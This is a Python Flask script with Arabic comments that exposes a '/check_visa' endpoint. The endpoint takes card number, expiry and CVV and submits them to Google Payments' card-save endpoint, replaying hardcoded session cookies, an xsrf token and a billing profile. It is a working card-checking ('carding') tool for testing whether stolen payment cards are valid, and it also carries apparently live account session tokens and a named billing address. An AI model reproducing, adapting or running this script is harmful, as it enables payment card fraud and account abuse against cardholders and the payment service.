from flask import Flask, request, jsonify
import requests
import urllib3

# تعطيل تحذارات SSL غير الضرورية
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/check_visa', methods=['GET'])
def check_visa():
    # استقبال بيانات الفيزا من query parameters
    visa_data = request.args.get('visa')
    
    if not visa_data:
        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    try:
        # تقسيم بيانات الفيزا إلى مكوناتها
        card_number, month, year, cvv = visa_data.split('|')
    except ValueError:
        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
    
    # تعريف الكوكيز المحدثة
    cookies = {
        'OTZ': '8178671_44_48_171240_44_319500',
        'AEC': 'AVh_V2hTIC9-mVszEOINI8u2nOJmGZ3LCjUDyCXNRSfyBh4uoAJZdNSpGJY',
        'NID': '525=mcMA7GuLkEP8iUOE84XtnzYoqYfofYvOu9sSXXbjLTh9_38vOcib-q5SXAU3MsBPFWQuo1HFv1G09wDv3rbEo8HywXckavVi1WzEbq-MtyxKCN9D7WLlg5fX3traoAEiDwghnKRCa9pToWNE5PmpJ_9Q4xGdpjpzEohIng7K_5FkSkKCPiJHD7ai-xjGIBL2hhZDus3dXMzAqjV8CUKvTGNFvMYrVo9bgkxDNnLDqjk_5JpYdeSB1bdpZEXZ9yonqZvTKUgCPCCkTrgN9QrMluZ8h8nYWMRNk7w9aaU_jWk9Q3RNBBnj-u2fE5wP4mW4_LgfYVlYa3IxGFdfIwl05Vtv1GMGHgpJ3tRnvK826RSF7-UWvecYIYyKbkMM6jrLRDHUuT5Tz6OouFN6ps133p08bOoNmvtfEGgIBJeUdRsalwCQ4pJZptUb3a_5y15IqbcKctDl0H7RVh3rR0QidNE7esTKGttU2ue8xmMiAZGVOGtCSUeMLfiKZIcNmN4sei22XYJvgJ8D3WILpfN-WDgup3XpxxTHLqDXHRGQDFwBDVw72pny9GziHSqD3VMZs0z7DO1pSkh-OvboEKT3D120aDO0Jy3BoeAM0Z_g-iy7kRTAVYVUqBR9im4iXbXKkEdke2vlZWoCCjhA8Sc0uWLPWpui67EW2A0dGiInCV--4rZkcOZgghSzk07zJfXByedr_68wBr26OAJa6O2gxrdmPkdNF9ywXY9jd0VNxCnOv6z-7t_S4cNDfl_zouuSE6V17aUVjY-QFK7zsduKH_Yoswjf2yxE0VKonIrJn9HjEvBQJAiHCgJwlOb4RDv3SmE228lQsuvotmAoMLNzjjKn_vkBKoDFACGJk4xLuMgim2pVQA_e6e-SVcG84XJuTBvMvYO35yZSiQcACmkDTR97k7vDa1gH1HjyjVZjejWv2W7hmfmN5OUZpz9e9TtSn4j99i1rBvfSUNy5wXm4KrilsQn_TdpR8XF7PepKess13sHpxwf8qp8bjwx8RNdyx3Rzp7vmSY1ynBbTysX0TF8AEdlJsgxdIuZrWmg4BbOFABL5IYdYUrzf5GQYwJSoBoQSEZ9MTD3EBEansy1KRDn4Fql_n12Hvldmup5bE1kf9WkUeDWmQXvbiRN9Fj6A6DYbcbW-',
        'SID': 'g.a000zgiGjxQ17mQFEYXquUwyYNDuM1F2VePuGJC7aaw2PkiMker7MPa7wz_LPxvDVVzDaZjL0wACgYKAf4SARYSFQHGX2MiyTUQ7QXjl7s3a9uwfMS3lxoVAUF8yKpHIVg9pG-VGA-nU53lBDdR0076',
        '__Secure-1PSID': 'g.a000zgiGjxQ17mQFEYXquUwyYNDuM1F2VePuGJC7aaw2PkiMker7XEef04TjMlgH3RPvFaVG_gACgYKAd4SARYSFQHGX2MinPZasfMXgN6AFLJmrL1lvRoVAUF8yKpbAUb4i7Ruufd3hVK3EHUk0076',
        '__Secure-3PSID': 'g.a000zgiGjxQ17mQFEYXquUwyYNDuM1F2VePuGJC7aaw2PkiMker7qJmg5shRPakuOA-vZX-0lgACgYKAf8SARYSFQHGX2MiBdyXrszkEaNmWJJk0xQsqxoVAUF8yKp0qil1YCZ_BYOg6Rqw_Mwz0076',
        'HSID': 'AOXPxduUrKQaPZ3E7',
        'SSID': 'A10Z9sFaohEdfM0Ki',
        'APISID': 'mTncr2CBzLZRbBgh/A_fCwEM6JRScGBMGz',
        'SAPISID': 'ZysW6ufdp1i4o0Ae/AC7raX2DeR48oQ52h',
        '__Secure-1PAPISID': 'ZysW6ufdp1i4o0Ae/AC7raX2DeR48oQ52h',
        '__Secure-3PAPISID': 'ZysW6ufdp1i4o0Ae/AC7raX2DeR48oQ52h',
        '__utma': '207539602.2100594883.1742201890.1753702107.1753707908.8',
        '__utmc': '207539602',
        '__utmz': '207539602.1753707908.8.8.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '__utmt': '1',
        '__utmb': '207539602.3.8.1753707908',
        'S': 'billing-ui-v3=XoDudc5evE_fBzjk8ZLCh7GzT9rhrocM:billing-ui-v3-efe=XoDudc5evE_fBzjk8ZLCh7GzT9rhrocM',
        'SIDCC': 'AKEyXzX_Nknshm9Q4HvXSO5lddE4CPYwfkAY8h93jn8faayxlvx5HlSbjEIajeh8HqLQ4anVAQ',
        '__Secure-1PSIDCC': 'AKEyXzWEe5JssfD_KGVQJ-ChKJlWIu_jci4V_RuZPaLFw2X6vvdh9GEutRBH3Nx0lGtq3DvUYqQ',
        '__Secure-3PSIDCC': 'AKEyXzXEM6YuArwG6tiq4Q-ulF2hX_9xBWemyzsYzCLYYzDr1z0BYVyANvwYzLbL4cF8yBRxmSE',
    }

    # تعريف الهيدرات المحدثة
    headers = {
        'authority': 'payments.google.com',
        'accept': '*/*',
        'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://payments.google.com',
        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1753707900678&cst=1753707905178&si=8753670855614345&pet&sri=2&hmi=false&ipi=dh71yb9nmtpb&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_sd53iz1cwlf60&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=500&cori=https%3A%2F%2Fwallet.google.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-arch': '""',
        'sec-ch-ua-bitness': '""',
        'sec-ch-ua-full-version': '"137.0.7337.0"',
        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"SM-A307FN"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"11.0.0"',
        'sec-ch-ua-wow64': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-client-data': 'CIOJywE=',
        'x-requested-with': 'XmlHttpRequest',
    }

    # تعريف البارامترات المحدثة
    params = {
        'ait': 'GAIA',
        'cn': '$p_sd53iz1cwlf60',
        'eo': 'https://wallet.google.com',
        'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
        'ipi': 'dh71yb9nmtpb',
        'hl': 'ar',
        'mm': 'e',
        'origin': 'https://wallet.google.com',
        'si': '8753670855614345',
        'style': ':m2',
        'cst': '1753707905178',
        'wst': '1753707900678',
        's7e': '3.1.0.0;3.1.0.1',
        'rt': 'j',
        's': '2',
    }

    # تعريف بيانات الطلب المحدثة
    data = {
        'xsrf': 'AJWlU2NidLzbTR4e6akI_gHbRFipjThesQ:1753707907984',
        '3.1.0.0': card_number,
        '3.1.0.1': cvv,
        'msg': '[[null,"ACo329zkoaGMwADqGbHCFc2tjVxZmtIDdS3dX3jdmiAMBb6NmQ6pzwKh0CrZI5Nerl+Gtv5ywk+w/5ydaBFIeA/nzjGXahf2N2gs+CisCvUG2Se+Ndz2sUxaJYRZ8b88YcHz+t25QvgshGlXU0Ddnk4/PkjGzLOHtlcdM78uuRhh+4LK/PdkwRwLrdgiN7rRSXIApAp3DnbQLnorvECdz0p69ld9GyfFNxGtQg0QW7wpyCVfCE4H+sZQ4Bns7pRVTzr9EyyoIcdR",null,[null,[null,null,null,["!Xl2lXQXNAAa73VJ7m91C1d_pJncnJYA7ADQBEArZ1BY2eSNOzaRtG55ufcLhPYsC2S_2_m3Vlr558JFt3_Zfn0OYdh15wOH7nOYMFitRAgAABX1SAAAAK2gBB34ATMv4YniYPnJaV7_hoVpP1G3pKFqsqwX6T_DRHKk9rWLQcPsWEwY_iaimvNulQwyBF27riP3r9fUMTlRPYhyd3O63HaXZkttW_Ex1T0GZCcE0yycNeX7qt6ANJJ561BEVJKF3Uvf7NzwNG8u67bztsJyHfGM9iCsca3ZPqvHqoW4Ck8lM3SjHCciMVBY7LVQxk8EVxqqMHAtPDacMandc2_k7_bl_F2tidN504Mz9ZdZHAhCRldR2jK7AXoJ14IdDX0_D0LopfwG7AZwGoWgRNMsglly5suljNbtz4fe1ipRSNsS3AqtcxjNNhVZh1nC02GXJ44GdiuDWomL_klEmKCNSKFsiTU4xvMAI_vO0anihyl0u-Q0-MiQW6sXNaYCRADXTrxS1fmrxt4R3Fkt5n8_EJN5vzeZTGiicyRgCT7gSCCTSBi-g0rI_5uGDo1mVeF67QrnXm3Lxq2dnGqRfBeZfB6OygSTmRPs_Yea-8JCCHUC66s79_Cxkjux_xMwUrg5ft8VLur4YVdwebPAKx6BXmhdk0UxuJ4sEM4Km6X6DuJHwImcFXxU7rjJp_gmZQJnC0jOWHByldMnuUP25vH-vr9Qes7oPbju1kbWhXb_FzVHEsx5SXYqIt2OvU0lVLermfPDPYhhSIsDyYrg4ASZ6yJ3AymTFTLkhVGjcGRjnQEwDudzXARo6s6VSkOI9-q7VXhP-YBl5F66bvNZHMkeKB3qw8YHsdZ95nltKhIcSVZdFUarD2nPITD1JJgSRdi7mEy8DOc6eZpYaULiX0pmbhbx21ugweT99O6WDV8zfXlZUVeerPGiaNX3lznZDspZysUHleDele2usmNlJHKU70oTv03xR22B2XThJ26yfHIX6CLFx8BXnueZszHyOCqb4r5WDKYp-BJbwmqdF5aP9_krCd3OSQLqS9OdQIPAO1O8T_GTCW1mAOmV0wlPhZXkMBMcVoOKkaFLemd614vqhaKfn5RM892zxvq6o96Jm_ObeqTEmIT6K7xPVfJ6j3CWoDIxt6Y_G2pCf7zdcSO2B0NaRcb3_wAhYFdz5L9yohw0aIs8jK9hmCyBvefGTbdzkMilc6nRzpG0tK949n-V_9lwnctjNUvp3DgT3hq81RpIhUe6JAA9BA7CqxGDXxtzp1tGqcdkE7arSe0xEOevmecryK3tzBSSnSVyXpn24QMkWO_e7kSarHV_SAu16WVgY1CXrTCAZCjbOry6NyImmh0qyCsw0ifrfCdPo0O3VAng2vSAW4WdKGnNv291I7qnOe0WhG5SzWMQ1M9UEJOsW3h4FYrCJkjcCRo2-SxwG5ulWJEDIH75Tjpt4EZDT6cEBYc_4U4pAvgg3_m9gG8jJ8tbVuoQjz4bY8VF8PX1egOwn79wRZha2mOewUzyfY-zVnxyMEb_5IVVl7u31NDTpdfAfiq3CCTirPrVaUKFPDXWWTLUfLCp1hkOHBaYelwZYVAyKBxLGY0TJMb-Zz3DqR2R05NklYkZqolOi3evhuuGN_mQsd1soEMH_bSMV4sUEEi4JD3tqgBYjClmrFNAZc3Sx12oS9qHcNw9XRw6bd8VAtUi2rCqrDpEZR8UoPqqJBlZPHWv5jrr3vDIc6S11eLPapVMFC8duXrUOG0mnASV7_KdivP8hwYpdiO1nWBzCaFKyDbU9dJvRzQR9w9uX4lUXFoh7dH6kHlVSe_Bn7jW_nxEGFJ1l-hYMKqKrAPOdTAnr-3OQGitXTMtBfpy__2pzzi1D02uvRlG5auveG6Y__HeBqG3ZMWlX6iE_xTbPDZ6DAxsGqx5UatV9XP0GOqTtkrZ7LnfKtOtqlpYf7KzDZC_HsEDkMSAhN8xC-K39baDAPT5AOj6mQDfIaAznl1aKc1RZq7wJSxzczfsOlhqjJUhQIbkqVKWFqeG1G--QUcS-lQL2oHuh3VYymCFh6m9s01V3rvc4CZRGDO6XWlXHNDxP-YdBkShkJPM9EhGVTjBNfxP56phUn6yQ2TkyTtjgobFUkHp8TbKsYqMv9CG9X_y3chCSFly_PwXa5suHRv9-UNEeKB7mF7s_-i_ibV59ddGTMXoQT0vwE83aEkdEolVJpDS6z3qtAwgRuglV9Dqg79qgPWDIDVp7vA5fccp6ECbtg5lACZmJ7En3QCCv-KszTON6c6mA234DNFQeJmxGilQW5ym2Z9L1kaXO8WZmfyHZ5GmjtmNV_YYoIO5tkgzubEzCeqb2XxvCwQgqtBXamwMq9DWz_e3Z1yxWhCHdwSypfNp1jRPJaH2auB3jxsLd8QITCe8JE7N3kSqsafDvFb2-LXLAaAPKaWsmcIUGOMaVPElZoBQUN38Z2ZY4y3nB7JBgQtYDdNWLaq9FXbsifAEkp9OQ7OYXovb45QjDnt-IJCCzge99ZJ6heEwA0_M5QkJgWzmYwQgAnS4biDF6UxlbBzT2s31cb-mL2DlJqBT5UTd9zzLCtnXbfkJ9R8VFmvIspy8fcGcjO5_ZI6Ku74AetIrMPViBr65hXiN1tfWX2k4rmvCOfQvY3kgRwtIpn9AiLmOFjS7CQ4gbaHZeb_fUAOMbkbcJkhzup-MhIpPHQnGhkFgARK7ECy_PVR4Xr1cpkuKtFnX69W0mzBUtvuNm8JMDYXVQ_zM7_RNchbXlFLQxUji9rZJz1mlI5BtjVJbQlU9uFTnJlvmSoJcnnKP2iKlwAfkU8pZowZ97ROwmJ4-67rzjhG5gfZWXg7z3As-qI5zcSTdHa-Sk4lBnXBUFfe_h8-Q2OcayQz-ScMJ1X6SWV95Hfq4itX57ZRu0CXLmoa3GV3ZoSS8A2MoEqZ4NuSwaguhsXS3KJGDfPGVDTCF5025uAyZbXTWAHgxbHbNRnLvymVf-5xuhlzWKMTRBmVR08wk7sbzO03J5Cj1O5a_F-dYRmnPeXkjoImWRo7bE6phdQe281UUeCs9WXBdiNhEcdyz6wtDqgKwvQL_0QInrjf05hHTT3v-4LdU8K3TzMiyYG_iuLeshmYIA39A1Qm7-2exL6KZAJV2YwQJLZhtvw3LsoxraPOUVA6HXpb18FekR_r9S1FxxMoGvba8i3rwSi3ZjtTHLpDRVlG6kN9JPBmRn3AAcrW3L-UylyTH4r-UYxGQpQnWH60CJ-XVF_9qyC961B8GnO7PKzFp1SS6g94ihsvMcYlJPAOKSmULmNosx_NAzz-EbX7opJVSqVm8-_B4VDk4UKaVRrfgW0hHLIEeAjln6wC-ZIo3P93dUwvRtQcuLLRBQila7wygnKOT2EWmeycSweNL9YR1jt6V12XFAP5dP81Wr964NTMAr3GmXOYxLlwgNHbZZrem8Gqw8Y4B-ZYqWJWSaBUMrAXj5j6XJJ8KCZMA2bR0fMzcJBP3F1-3S2JPSJ3HatEWDmlPuaE8YOt4m8I_lj_OxNKBTh03s_imv"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",11,2029,null,"5546",null,"__s7e_data__61bb463a","Mia Reid",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAIQAhogEgJVUxoDVVNEMAZAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,0,2b6,edd98bac,0,18,4863fd35,1,140,cb2d5c6f,0,2b6,6ad47c6c,1,e8,7bdb49f6,1,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,1,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,5:a21,3,19851230711,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2c3:a40,"f,198512309d4,"n,0,0,"t,19851230101,0,0,0,0,1985123010d,1985123010d,1985123010d,1985123010d,1985123010d,0,19851230117,198512304a7,198512304d0,198512304c7,19851230731,19851230731,19851230a1d,19851230d4c,19851230d4c,19851230d84:a10:a31,3,"h,1,"p,1cc,22,"m,12,f,122,1b37,175b,4b6,11ae,5c4,1449,cac,4a2,1f64,4d1,263b'
    }

    try:
        # إضافة جلسة مع إعدادات أفضل للاتصال
        session = requests.Session()
        session.verify = False  # تعطيل التحقق من SSL (لأغراض الاختبار فقط)
        session.headers.update(headers)
        
        # إرسال الطلب مع إعدادات متقدمة
        response = session.post(
            'https://payments.google.com/efe/payments/u/1/instrument_manager_save_page',
            params=params,
            cookies=cookies,
            data=data,
            timeout=15,
            allow_redirects=True
        )
        
        # إرجاع الاستجابة كـ JSON
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'content': response.text
        })
        
    except requests.exceptions.RequestException as e:
        return jsonify({
            'error': str(e),
            'message': 'فشل في الاتصال بخادم جوجل. يرجى التحقق من اتصال الإنترنت أو تحديث الكوكيز والهيدرات.'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
